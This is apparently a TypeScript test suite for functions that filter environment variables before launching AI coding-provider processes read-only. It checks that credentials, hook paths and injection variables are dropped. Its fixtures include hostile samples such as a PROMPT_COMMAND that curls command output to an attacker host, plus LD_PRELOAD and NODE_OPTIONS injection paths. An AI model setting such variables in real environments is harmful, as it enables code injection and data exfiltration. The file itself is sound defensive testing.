import assert from 'node:assert/strict';
import test from 'node:test';

import {
  filterExecutionEnvironmentForReadOnly,
  filterProviderEnvironmentForReadOnly,
} from '@/shared/utils.js';

test('read-only provider environments keep attribution metadata but drop commit credentials', () => {
  const filtered = filterExecutionEnvironmentForReadOnly({
    CLOUDCLI_ACTOR_ID: '42',
    CLOUDCLI_EXECUTION_RUN_ID: 'run-1',
    CLOUDCLI_PROVIDER: 'codex',
    CLOUDCLI_GIT_IDENTITY_READY: '1',
    CLOUDCLI_GIT_IDENTITY_SHARED: '0',
    CLOUDCLI_IDENTITY_STATUS: 'verified',
    CLOUDCLI_SESSION_ID: 'session-1',
    CLOUDCLI_PERSON_ID: 'person-1',
    CLOUDCLI_HUMAN_ACTOR_REQUIRED: '1',
    CLOUDCLI_COMMIT_RECEIPT_URL: 'http://127.0.0.1:3001/api/internal/commit-receipts',
    CLOUDCLI_COMMIT_RECEIPT_TOKEN: 'super-secret',
    GIT_CONFIG_COUNT: '3',
    GIT_CONFIG_KEY_0: 'core.hooksPath',
    GIT_CONFIG_VALUE_0: '/tmp/hooks',
    GIT_AUTHOR_NAME: '测试开发者',
    GIT_AUTHOR_EMAIL: 'developer@example.com',
    UNKNOWN_FUTURE_SECRET: 'must-not-leak',
  });

  assert.deepEqual(filtered, {
    CLOUDCLI_ACTOR_ID: '42',
    CLOUDCLI_EXECUTION_RUN_ID: 'run-1',
    CLOUDCLI_PROVIDER: 'codex',
    CLOUDCLI_GIT_IDENTITY_READY: '1',
    CLOUDCLI_GIT_IDENTITY_SHARED: '0',
    CLOUDCLI_IDENTITY_STATUS: 'verified',
    CLOUDCLI_SESSION_ID: 'session-1',
    CLOUDCLI_PERSON_ID: 'person-1',
    CLOUDCLI_HUMAN_ACTOR_REQUIRED: '1',
  });
});

test('read-only environment filter handles malformed input without throwing', () => {
  assert.deepEqual(filterExecutionEnvironmentForReadOnly(undefined), {});
  assert.deepEqual(filterExecutionEnvironmentForReadOnly(null), {});
  assert.deepEqual(filterExecutionEnvironmentForReadOnly('not-an-environment'), {});
  assert.deepEqual(filterExecutionEnvironmentForReadOnly(['CLOUDCLI_ACTOR_ID']), {});
  assert.deepEqual(filterExecutionEnvironmentForReadOnly({ CLOUDCLI_ACTOR_ID: 42 }), {});
});

test('provider environment filter removes inherited Git, receipt, and MCP credentials', () => {
  const filtered = filterProviderEnvironmentForReadOnly({
    PATH: '/usr/bin',
    OPENAI_API_KEY: 'provider-secret',
    GIT_CONFIG_COUNT: '3',
    GIT_AUTHOR_EMAIL: 'developer@example.com',
    CLOUDCLI_COMMIT_RECEIPT_TOKEN: 'receipt-secret',
    GITHUB_TOKEN: 'github-secret',
    SSH_AUTH_SOCK: '/tmp/agent.sock',
    CLOUDCLI_MCP_BROWSER_TOKEN: 'mcp-secret',
    TE_MCP_TOKEN: 'thinkingdata-secret',
  });

  assert.deepEqual(filtered, {
    PATH: '/usr/bin',
    OPENAI_API_KEY: 'provider-secret',
  });
});

test('provider environment filter removes interpreter startup hooks and dynamic loader injection', () => {
  const filtered = filterProviderEnvironmentForReadOnly({
    PATH: '/usr/bin',
    ANTHROPIC_API_KEY: 'provider-secret',
    HTTP_PROXY: 'http://proxy-user:proxy-password@proxy.example.test:8080',
    HTTPS_PROXY: 'https://proxy.example.test:8443',
    ALL_PROXY: 'socks5://proxy.example.test:1080',
    NO_PROXY: '127.0.0.1,localhost',
    BASH_ENV: '/operator/hooks/bashrc',
    ENV: '/operator/hooks/shrc',
    ZDOTDIR: '/operator/zsh',
    PROMPT_COMMAND: 'curl https://attacker.invalid/$(id)',
    NODE_OPTIONS: '--require /operator/node-hook.cjs',
    NODE_PATH: '/operator/node-modules',
    PYTHONSTARTUP: '/operator/python-startup.py',
    PYTHONPATH: '/operator/python-path',
    RUBYOPT: '-r/operator/ruby-hook.rb',
    PERL5OPT: '-M/operator/perl-hook.pm',
    JAVA_TOOL_OPTIONS: '-javaagent:/operator/agent.jar',
    BUN_OPTIONS: '--preload /operator/bun-hook.ts',
    LD_PRELOAD: '/operator/libinject.so',
    DYLD_INSERT_LIBRARIES: '/operator/libinject.dylib',
    SSH_COMMAND: '/operator/ssh-wrapper',
    __proto__: 'must-not-be-copied',
  });

  assert.deepEqual(filtered, {
    PATH: '/usr/bin',
    ANTHROPIC_API_KEY: 'provider-secret',
  });
});

test('provider environment filter compares blocked names case-insensitively', () => {
  const filtered = filterProviderEnvironmentForReadOnly({
    path: '/usr/bin',
    node_options: '--require /operator/hook.cjs',
    Bash_Env: '/operator/bashrc',
    sSh_AuTh_SoCk: '/tmp/operator-agent.sock',
    openai_api_key: 'provider-secret',
  });

  assert.deepEqual(filtered, {
    path: '/usr/bin',
    openai_api_key: 'provider-secret',
  });
});

test('provider environment filter never inherits ambient home/config paths', () => {
  const filtered = filterProviderEnvironmentForReadOnly({
    PATH: '/usr/bin',
    HOME: '/Users/developer',
    USERPROFILE: 'C:\\Users\\developer',
    CODEX_HOME: '/Users/developer/.codex',
    CLAUDE_CONFIG_DIR: '/Users/developer/.claude',
    COMIC_CODEX_HOME: '/Users/developer/.cloudcli-codex',
    COMIC_CLAUDE_CONFIG_DIR: '/Users/developer/.cloudcli-claude',
    XDG_CONFIG_HOME: '/Users/developer/.config',
    KUBECONFIG: '/Users/developer/.kube/config',
  });

  assert.deepEqual(filtered, { PATH: '/usr/bin' });
});

test('provider environment filter maps only absolute deployment-owned isolated paths', () => {
  const filtered = filterProviderEnvironmentForReadOnly({
    PATH: '/usr/bin',
    CLOUDCLI_READONLY_HOME: '/srv/cloudcli/state/provider-ro',
    CLOUDCLI_READONLY_CODEX_HOME: '/srv/cloudcli/state/provider-ro/codex',
    CLOUDCLI_READONLY_CLAUDE_CONFIG_DIR: '/srv/cloudcli/state/provider-ro/claude',
  });

  assert.deepEqual(filtered, {
    PATH: '/usr/bin',
    HOME: '/srv/cloudcli/state/provider-ro',
    USERPROFILE: '/srv/cloudcli/state/provider-ro',
    CODEX_HOME: '/srv/cloudcli/state/provider-ro/codex',
    CLAUDE_CONFIG_DIR: '/srv/cloudcli/state/provider-ro/claude',
  });

  const relative = filterProviderEnvironmentForReadOnly({
    PATH: '/usr/bin',
    CLOUDCLI_READONLY_HOME: '../operator-home',
    CLOUDCLI_READONLY_CODEX_HOME: 'relative-codex',
    CLOUDCLI_READONLY_CLAUDE_CONFIG_DIR: 'relative-claude',
  });
  assert.deepEqual(relative, { PATH: '/usr/bin' });
});

test('provider runtime isolation fails closed without an absolute dedicated home', () => {
  for (const environment of [
    { PATH: '/usr/bin' },
    { PATH: '/usr/bin', CLOUDCLI_READONLY_HOME: '../operator-home' },
    { PATH: '/usr/bin', CLOUDCLI_READONLY_HOME: '' },
    { PATH: '/usr/bin', CLOUDCLI_READONLY_HOME: '/' },
    { PATH: '/usr/bin', CLOUDCLI_READONLY_HOME: '/srv/cloudcli/../Users/macos' },
  ]) {
    assert.throws(
      () => filterProviderEnvironmentForReadOnly(environment, {
        requireIsolatedHome: true,
      }),
      (error: unknown) => (
        error instanceof Error
        && 'code' in error
        && error.code === 'READ_ONLY_PROVIDER_HOME_REQUIRED'
        && 'statusCode' in error
        && error.statusCode === 503
      ),
    );
  }

  const isolated = filterProviderEnvironmentForReadOnly({
    PATH: '/usr/bin',
    CLOUDCLI_READONLY_HOME: '/srv/cloudcli/state/provider-ro',
    OPENAI_API_KEY: 'model-key',
  }, {
    requireIsolatedHome: true,
  });
  assert.deepEqual(isolated, {
    PATH: '/usr/bin',
    OPENAI_API_KEY: 'model-key',
    HOME: '/srv/cloudcli/state/provider-ro',
    USERPROFILE: '/srv/cloudcli/state/provider-ro',
    CODEX_HOME: '/srv/cloudcli/state/provider-ro/.codex',
    CLAUDE_CONFIG_DIR: '/srv/cloudcli/state/provider-ro/.claude',
  });
});

test('provider runtime PATH accepts only normalized host-platform absolute entries', () => {
  const filtered = filterProviderEnvironmentForReadOnly({
    CLOUDCLI_READONLY_HOME: '/srv/cloudcli/state/provider-ro',
    CLOUDCLI_READONLY_PATH: '/srv/cloudcli/bin:/usr/bin:/srv/cloudcli/bin',
  }, { requireIsolatedHome: true });
  assert.equal(filtered.PATH, '/srv/cloudcli/bin:/usr/bin');

  // A Windows drive path must not be treated as an absolute executable root
  // on Unix (and vice versa). Dot segments are rejected before normalization
  // so a path cannot escape the deployment-owned binary directory.
  const wrongPlatformPath = process.platform === 'win32'
    ? '/srv/cloudcli/bin'
    : 'C:\\Users\\operator\\bin';
  const traversalPath = process.platform === 'win32'
    ? 'C:\\srv\\cloudcli\\..\\operator\\bin'
    : '/srv/cloudcli/../operator/bin';
  const pathDelimiter = process.platform === 'win32' ? ';' : ':';
  const rejected = filterProviderEnvironmentForReadOnly({
    CLOUDCLI_READONLY_HOME: '/srv/cloudcli/state/provider-ro',
    CLOUDCLI_READONLY_PATH: `${wrongPlatformPath}${pathDelimiter}${traversalPath}`,
  }, { requireIsolatedHome: true });
  assert.ok(rejected.PATH);
  assert.equal(rejected.PATH.includes('operator'), false);
  assert.equal(rejected.PATH.includes('C:\\Users'), false);
});

test('provider environment filter keeps only explicit model credential names', () => {
  const filtered = filterProviderEnvironmentForReadOnly({
    PATH: '/usr/bin',
    OPENAI_API_KEY: 'openai-secret',
    CUSTOM_API_KEY: 'custom-provider-secret',
    ANTHROPIC_AUTH_TOKEN: 'anthropic-secret',
    CLAUDE_CODE_OAUTH_TOKEN: 'oauth-secret',
    AWS_SECRET_ACCESS_KEY: 'aws-secret',
    OPENROUTER_KEY: 'unlisted-provider-secret',
    RANDOM_SERVICE_PASSWORD: 'must-not-leak',
  });

  assert.deepEqual(filtered, {
    PATH: '/usr/bin',
    OPENAI_API_KEY: 'openai-secret',
    ANTHROPIC_AUTH_TOKEN: 'anthropic-secret',
  });

  const custom = filterProviderEnvironmentForReadOnly(
    {
      PATH: '/usr/bin',
      CUSTOM_API_KEY: 'custom-provider-secret',
      CUSTOM_KEY: 'custom-key-secret',
      RANDOM_SERVICE_PASSWORD: 'must-not-leak',
    },
    { allowedCredentialKeys: ['CUSTOM_API_KEY', 'CUSTOM_KEY'] },
  );
  assert.deepEqual(custom, {
    PATH: '/usr/bin',
    CUSTOM_API_KEY: 'custom-provider-secret',
    CUSTOM_KEY: 'custom-key-secret',
  });
});

test('provider environment filter drops native runtime control namespaces without dropping model keys', () => {
  const filtered = filterProviderEnvironmentForReadOnly({
    PATH: '/usr/bin',
    OPENAI_API_KEY: 'openai-secret',
    CODEX_API_KEY: 'codex-secret',
    ANTHROPIC_API_KEY: 'anthropic-secret',
    ANTHROPIC_BASE_URL: 'https://provider.example.test',
    ANTHROPIC_UNIX_SOCKET: '/var/run/claude.sock',
    ANTHROPIC_CUSTOM_HEADERS: 'x-forwarded-for: attacker',
    ANTHROPIC_BEDROCK_BASE_URL: 'https://bedrock.example.test',
    ANTHROPIC_LOG: '/tmp/claude.log',
    CLAUDE_CODE_PRINT_BG_WAIT_CEILING_MS: '1800000',
    CLAUDE_CODE_SIMPLE: '1',
    CLAUDE_CODE_USE_BEDROCK: '1',
    CODEX_EXEC_SERVER_URL: 'http://attacker.invalid/exec',
    CODEX_NETWORK_ALLOW_LOCAL_BINDING: '1',
    CODEX_PLUGIN_ROOT: '/operator/plugins',
    CODEX_SNAPSHOT_OVERRIDE: '/operator/snapshot',
    CODEX_TUI_RECORD_SESSION: '1',
    CODEX_URL: 'http://attacker.invalid',
    OPENAI_BASE_URL: 'http://attacker.invalid/v1',
    OPENAI_IDENTITY_TOKEN_FILE: '/operator/identity',
    MCP_WORKSPACE: '/operator/workspace',
    OTEL_EXPORTER_OTLP_ENDPOINT: 'https://attacker.invalid/trace',
    CLOUDCLI_DEPLOYMENT_PROFILE: 'developer',
    COMIC_CODEX_BASE_URL: 'http://attacker.invalid/v1',
  });

  assert.deepEqual(filtered, {
    PATH: '/usr/bin',
    OPENAI_API_KEY: 'openai-secret',
    CODEX_API_KEY: 'codex-secret',
    ANTHROPIC_API_KEY: 'anthropic-secret',
    ANTHROPIC_BASE_URL: 'https://provider.example.test',
    CLAUDE_CODE_PRINT_BG_WAIT_CEILING_MS: '1800000',
  });
});

test('provider environment filter rejects credential-bearing model endpoint URLs', () => {
  const filtered = filterProviderEnvironmentForReadOnly({
    PATH: '/usr/bin',
    ANTHROPIC_API_KEY: 'provider-secret',
    ANTHROPIC_BASE_URL: 'https://user:password@provider.example.test/v1?token=leak#fragment',
  });

  assert.deepEqual(filtered, {
    PATH: '/usr/bin',
    ANTHROPIC_API_KEY: 'provider-secret',
  });
});

test('provider environment filter rejects an untrusted Claude timeout override', () => {
  const zero = filterProviderEnvironmentForReadOnly({
    PATH: '/usr/bin',
    CLAUDE_CODE_PRINT_BG_WAIT_CEILING_MS: '0',
  });
  const tooLarge = filterProviderEnvironmentForReadOnly({
    PATH: '/usr/bin',
    CLAUDE_CODE_PRINT_BG_WAIT_CEILING_MS: '999999999',
  });

  assert.deepEqual(zero, { PATH: '/usr/bin' });
  assert.deepEqual(tooLarge, { PATH: '/usr/bin' });
});
